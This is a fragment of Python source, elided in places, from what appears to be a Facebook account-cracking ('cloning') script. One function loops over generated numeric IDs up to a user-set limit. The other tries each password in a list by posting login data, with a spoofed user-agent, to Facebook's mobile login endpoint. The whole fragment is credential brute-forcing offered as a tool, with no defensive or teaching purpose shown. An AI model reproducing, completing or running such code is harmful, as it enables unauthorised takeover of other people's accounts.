...
def BD_CLONING():
                ...
                try:
                        ...
                        print(52*'-')
                        limit = input('\033[1;37m INPUT LIMIT  : ')
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
...
def HDX_CRACK(ids,passlist,tl):
    ...
    try:
        for pas in passlist:
            ...
            'user-agent': pro}
            lo = session.post('https://m.beta.facebook.com/login/device-based/regular/login/?next=https%3A%2F%2Fmbasic.facebook.com%2F&refsrc=deprecated&lwv=100&refid=9',data=log_data,headers=header_freefb).text
